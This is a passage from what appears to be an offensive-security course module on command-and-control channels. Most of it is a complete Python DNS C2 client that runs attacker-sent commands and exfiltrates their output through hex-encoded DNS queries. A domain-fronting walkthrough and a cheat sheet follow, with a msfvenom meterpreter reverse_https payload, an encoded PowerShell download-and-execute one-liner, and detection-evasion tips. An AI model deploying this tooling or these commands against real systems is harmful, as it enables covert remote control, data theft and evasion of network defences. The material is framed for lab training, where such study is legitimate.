Dependencies: Python 3 (stdlib: socket/struct/binascii/subprocess); the target must be able to send UDP 53 queries to --server.
      Target with no Python interpreter: use the dnscat2 client, or follow the "porting notes" at the end of the file and rewrite it in PowerShell (Resolve-DnsName).

Usage:
    python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
        --session a1b2c3d4 --interval 2
    # Server console: list / send a1b2c3d4 whoami /priv / quit

Placeholders: LHOST=--server (DNS server / attacker machine IP), LPORT=--port (default 53), DOMAIN=--domain (channel domain suffix),
        --session=8-digit hex session ID (randomly generated and printed when omitted)

Protocol contract (strictly matches m09-dns-c2-server.py):
    Heartbeat command fetch: query A   h.<session>.<domain>
                -> the server packs commands to be delivered 4 bytes at a time into A record rdata (max 40 bytes per heartbeat),
                  commands end with b"\n"; the client only considers a command complete once it has accumulated b"\n".
    Output exfil:   query A   o.<session>.<hexchunk0>.<hexchunk1>...<domain>
                -> the server concatenates the hex labels, runs unhexlify, and appends the result to outdir/<session>.out

Test status: passes python3 -m py_compile; a direct loopback test with m09-dns-c2-server.py on 127.0.0.1 has been done
          (the server received heartbeats, delivered commands, and received exfiltrated output). The real domain NS deployment must be validated in a lab environment.

Known issue (server-side, this client does not change it): inside build_reply() of m09-dns-c2-server.py
    struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
  6 values are passed for 5 H format chars, so the server crashes with struct.error on every reply; the maintainer must change it to ">HHHHHH".
  Until the server is fixed, this client can send heartbeats normally but cannot fetch commands.
"""
import argparse
import binascii
import os
import random
import socket
import struct
import subprocess
import sys
import time

CMD_END = b"\n"        # Same as the server: command end marker
HEX_LABEL = 60         # 60 hex chars per DNS label (<63, and even so it splits cleanly into bytes)
MAX_QNAME = 253        # DNS name total length limit
MAX_OUTPUT = 4096      # byte cap for the exfil of one command (truncated on overflow, so oversized queries are not dropped)
DEFAULT_TIMEOUT = 60   # local execution timeout for one command (seconds)

def encode_name(name):
    """Encode a.b.c into DNS wire format (each label <=63)."""
    out = b""
    for label in name.split("."):
        raw = label.encode("ascii")
        if len(raw) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(raw)]) + raw
    return out + b"\x00"

def read_name(data, off):
    """Parse a DNS name (supports 0xC0 compression pointers), returns (name, end offset)."""
    labels = []
    end = None
    jumped = False
    while True:
        if off >= len(data):
            raise ValueError("truncated name")
        ln = data[off]
        if ln == 0:
            off += 1
            if end is None:
                end = off
            break
        if ln & 0xC0 == 0xC0:
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            jumped = True
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    if jumped and end is None:
        end = off
    return ".".join(labels), end

def build_query(qname, qtype=1):
    """Build a standard DNS query packet (qtype defaults to A)."""
    tid = random.randint(0, 0xFFFF)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    return tid, header + encode_name(qname) + struct.pack(">HH", qtype, 1)

def parse_a_records(data, want_tid):
    """Parse the reply and return the list of 4-byte rdata from A records; returns an empty list when tid does not match or on error."""
    if len(data) < 12:
        return []
    tid, _flags, qd, an, _ns, _ar = struct.unpack(">HHHHHH", data[:12])
    if tid != want_tid:
        return []
    off = 12
    try:
        for _ in range(qd):
            _name, off = read_name(data, off)
            off += 4                      # qtype + qclass
        out = []
        for _ in range(an):
            _name, off = read_name(data, off)
            if off + 10 > len(data):
                break
            rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
            off += 10
            rdata = data[off:off + rdlen]
            off += rdlen
            if rtype == 1 and rdlen == 4:
                out.append(rdata)
        return out
    except (ValueError, struct.error):
        return []

def dns_query(server, port, qname, timeout=3.0, retries=2):
    """Send one A query and return the list of A record rdata (empty list on failure/timeout)."""
    for _ in range(retries + 1):
        try:
            tid, packet = build_query(qname)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            try:
                s.sendto(packet, (server, port))
                data, _addr = s.recvfrom(4096)
            finally:
                s.close()
            records = parse_a_records(data, tid)
            if records is not None:
                return records
        except (socket.timeout, OSError):
            time.sleep(0.2)
    return []

def fetch_command(server, port, session, domain, timeout):
    """Heartbeat: h.<session>.<domain>, returns the command bytes received this round (may be part of one command)."""
    qname = "h.%s.%s" % (session, domain)
    if len(qname) > MAX_QNAME:
        print("[-] qname too long: %s" % qname, flush=True)
        return b""
    chunks = dns_query(server, port, qname, timeout)
    return b"".join(chunks).rstrip(b"\x00")

def send_output(server, port, session, domain, data, timeout, max_output=MAX_OUTPUT):
    """Output exfil: o.<session>.<hex...>.<domain>, automatically split into multiple queries by length."""
    if not data:
        data = b"(none)"
    data = data[:max_output]
    hexs = binascii.hexlify(data).decode("ascii")
    labels = [hexs[i:i + HEX_LABEL] for i in range(0, len(hexs), HEX_LABEL)]
    if not labels:
        labels = ["00"]

    prefix = "o." + session + "."
    suffix = "." + domain
    cap = MAX_QNAME - len(prefix) - len(suffix)
    if cap <= 0:
        print("[-] domain suffix too long, cannot exfiltrate", flush=True)
        return

    batch, batch_len = [], 0
    sent = 0
    for label in labels:
        cost = len(label) + 1
        if batch and batch_len + cost > cap:
            dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
            sent += 1
            batch, batch_len = [], 0
        batch.append(label)
        batch_len += cost
    if batch:
        dns_query(server, port, prefix + ".".join(batch) + suffix, timeout, retries=1)
        sent += 1
    print("[>] exfiltrated %d bytes (%d queries)" % (len(data), sent), flush=True)

def run_command(cmd_bytes, timeout):
    """Run a command locally, returns stdout+stderr bytes."""
    try:
        cmd = cmd_bytes.decode("utf-8", "replace").strip()
    except AttributeError:
        cmd = str(cmd_bytes).strip()
    if not cmd:
        return b"(empty command)"
    print("[+] running: %s" % cmd, flush=True)
    try:
        if os.name == "nt":
            p = subprocess.Popen(cmd, shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            p = subprocess.Popen(["/bin/sh", "-c", cmd],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            out, err = p.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            out, err = p.communicate()
            return (out or b"") + (err or b"") + b"\n[!] timeout"
        result = (out or b"") + (err or b"")
        return result if result else b"(no output)"
    except OSError as e:
        return ("exec error: %s" % e).encode()

def main():
    ap = argparse.ArgumentParser(
        description="Minimal DNS C2 client (scenario 32, pairs with m09-dns-c2-server.py)")
    ap.add_argument("--server", required=True, help="DNS server address (LHOST)")
    ap.add_argument("--port", type=int, default=53, help="DNS server port (default 53)")
    ap.add_argument("--domain", required=True, help="channel domain suffix, e.g. c2.example")
    ap.add_argument("--session", default="", help="session ID (8-digit hex); randomly generated when omitted")
    ap.add_argument("--interval", type=float, default=2.0, help="heartbeat interval in seconds (default 2)")
    ap.add_argument("--dns-timeout", type=float, default=3.0, help="DNS timeout per query in seconds")
    ap.add_argument("--cmd-timeout", type=int, default=DEFAULT_TIMEOUT, help="per-command execution timeout in seconds")
    ap.add_argument("--max-output", type=int, default=MAX_OUTPUT, help="exfil byte cap for one command")
    ap.add_argument("--count", type=int, default=0, help="max heartbeat count, 0=unlimited (handy for a one-shot test)")
    args = ap.parse_args()

    session = args.session.strip().lower()
    if not session:
        session = "%08x" % random.getrandbits(32)
    if len(session) > 16 or any(c not in "0123456789abcdef" for c in session):
        print("[-] --session must be <=16 hex chars", file=sys.stderr)
        return 2

    print("[*] DNS C2 client started", flush=True)
    print("[*] server=%s:%d domain=%s session=%s interval=%.1fs"
          % (args.server, args.port, args.domain, session, args.interval), flush=True)
    print("[*] exit: Ctrl+C", flush=True)

    buf = b""
    beats = 0
    try:
        while True:
            if args.count and beats >= args.count:
                break
            beats += 1
            chunk = fetch_command(args.server, args.port, session,
                                  args.domain, args.dns_timeout)
            if chunk:
                buf += chunk
                while CMD_END in buf:
                    cmd, buf = buf.split(CMD_END, 1)
                    output = run_command(cmd, args.cmd_timeout)
                    send_output(args.server, args.port, session, args.domain,
                                output, args.dns_timeout, args.max_output)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] interrupt received, exiting", flush=True)
    return 0

if __name__ == "__main__":
    sys.exit(main())

# ============================================================
# Porting notes (when the target has no Python)
#   PowerShell: Resolve-DnsName -Name "h.<session>.<domain>" -Type A -Server LHOST
#     -> take the IPAddress of each A record in the reply and split its 4 bytes as dotted decimal to restore the command bytes;
#     to exfiltrate, Resolve-DnsName -Name "o.<session>.<hex>.<domain>" -Type A -Server LHOST is enough (the result is discarded, the server has already recorded it).
#   dnscat2: on the server dnscat2-server --domain c2.example, on the client the dnscat2 binary; use it when you need a truly interactive shell.
#   UDP 53 blocked but TCP 53 open: this script only covers UDP, switch to a tunnel tool that supports TCP.
# ============================================================
````

**Validation**: the server console receives the session heartbeat (`[+] session ...`) and prints command output; `tcpdump -i eth0 udp port 53` shows regular `x.<session>.c2.example` queries.

**Failure branches and alternatives**:
- The egress only resolves internal names, or forces internal DNS → can that internal DNS forward `c2.example` to your authoritative server? If not, this scenario is dead (switch to 28/31).
- No Python interpreter on the target → use a compiled dnscat2 client, or port the client logic to PowerShell (with `Resolve-DnsName`); the script header comments list the porting points.
- The tunnel is blocked (request-rate or long-label detection) → raise `--interval`, shorten the per-packet payload, and keep commands few and precise.
- UDP 53 is blocked but TCP 53 works → you need a tunnel tool that supports TCP (dnscat2 does); our own script only covers UDP.

**Exam / OPSEC notes**: long hex subdomains plus a high heartbeat rate are strong detection signatures — use them only where the lab rules allow it (the scenario assumptions state that the course lab permits it). Do not pull large command output in one go. Before starting the DNS server on 53, confirm the port is free and that the target's egress policy does not block it separately.

---

## Scenario 33: The target restricts destination domains, and the lab infrastructure supports domain fronting

**Situation**: the target may only reach a specific front-end address and the back end is unreachable directly; the lab infrastructure supports front-end/back-end separation (course text §14.6).

**Assumptions**: you have a front-end address the target **is allowed to reach** (the FRONT domain/IP); some facility can route requests to the back end by HTTP Host header — a real CDN (Azure Front Door, for example) or a self-built nginx reverse proxy; the back end is your C2/delivery server. **What makes domain fronting work**: the egress inspection sees the TLS SNI and destination address as FRONT (allowed), while the HTTP Host header carries the back-end routing.

**Prepare (attacker side)**: a self-built lab front-end nginx (443 + a FRONT certificate) plus a back-end listener:

```bash
# nginx frontend config, see m09-domain-fronting-nginx.conf
# backend C2/delivery listener
bash m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 8443
# or msf: use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; run
```

**Procedure**:
1. From the target, confirm FRONT:443 is reachable (`Test-NetConnection FRONT -Port 443`) and that the back end is not directly reachable.
2. Client template — TLS to FRONT, HTTP Host header pointing at the back end:
```bash
# target-side curl (bundled with Windows 10+)
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD
```
```powershell
# or a PowerShell downloader/callback, with the Host header pointing at the backend vhost
# $c = New-Object Net.WebClient; $c.Headers.Add("Host","BACKEND"); $c.DownloadString("https://FRONT/PAYLOAD")
```
3. The nginx front end routes by Host: Host=FRONT → the normal page (cover); Host=BACKEND → `proxy_pass` to the back-end listener. At the egress only FRONT is visible (SNI, certificate and destination domain all match the allow rule).
4. Validation: the back-end listener receives the request from the target (the source is the front-end IP or the target IP, depending on where the proxy sits); the download or session succeeds.
5. Real-CDN variant: register BACKEND as the CDN origin, use the domain the target allows as the front end, and verify the routing with a harmless GET before you send a payload.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-domain-fronting-nginx.conf` | Self-built domain-fronting front end (routes to the back end by Host) | replace FRONT / BACKEND / certificate paths |
| `m09-https-listener.sh` | Back-end HTTPS listener/delivery | `--port 8443` |
| `m09-proxy-aware-downloader.ps1` | Download on the target side (can set the Host header) | `-Url https://FRONT/PAYLOAD -HostHeader BACKEND` |

**Validation**: the back-end listener/nginx log shows the target's request with Host=BACKEND; the harmless GET works before you send a real payload; the egress side (if you get a chance to capture there) shows only FRONT.

**Failure branches and alternatives**:
- The front end routes by SNI instead of Host, or checks that SNI and Host agree → domain fronting is unavailable → fall back to scenario 28 (proxy) or 32 (DNS).
- The CDN does not forward a custom Host (many return 502 or refuse) → that lab infrastructure does not support it; use a self-built front end, or drop the approach.
- The target only allows FRONT and FRONT is not a domain whose certificate you control → you would have to borrow its certificate chain, which is normally impossible → change channel.

**Exam / OPSEC notes**: scenario 33 is **infrastructure-dependent** (the original scenario states plainly that it "depends on specific service support") — verify the routing once with a harmless GET before the exam, and do not make a payload your first attempt during it. Domain fronting requires understanding the Host/SNI split; if you cannot explain the mechanism, do not force it into your report.

---

## Module cheat sheet

```bash
# embedded payload (scenario 17)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1

# encode a PowerShell command (scenario 17/28/31; cheat sheet: Encode PowerShell Payloads)
echo -en 'iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))' | iconv -t UTF-16LE | base64 -w 0
powershell -nop -w hidden -enc <BASE64>

# view/set proxy (scenario 28/29)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
netsh winhttp show proxy && netsh winhttp set proxy proxy-server=http://proxy:8080 && netsh winhttp reset proxy

# proxy-aware download (scenario 28/29/31)
powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -Command -DefaultCreds

# DNS channel (scenario 32, start 53 as root)
sudo python3 m09-dns-c2-server.py --domain c2.example
python3 m09-dns-c2-client.py --server LHOST --session a1b2c3d4

# domain fronting access template (scenario 33)
curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD

# HTTPS listener (scenario 30/31/33)
bash m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
```

## Related lab files

| Script | Scenarios |
|---|---|
| `m09-proxy-aware-downloader.ps1` | 28, 29, 30, 31 |
| `m09-dns-c2-server.py` | 32 |
| `m09-dns-c2-client.py` | 32 |
| `m09-domain-fronting-nginx.conf` | 33, 31 |
| `m09-https-listener.sh` | 30, 31, 33 |

Cross-module references: `m00-delivery-server.py` (delivery and logging for 17/28/30), `m01-shellcode-runner-vba-archbranch.vba` (embedded, 17), `m03-dotnettojscript-loader.js` (bridge, 17), [08-pivoting-tunneling](/modules/08-pivoting-tunneling) (tunnelling alternatives for 29/30).
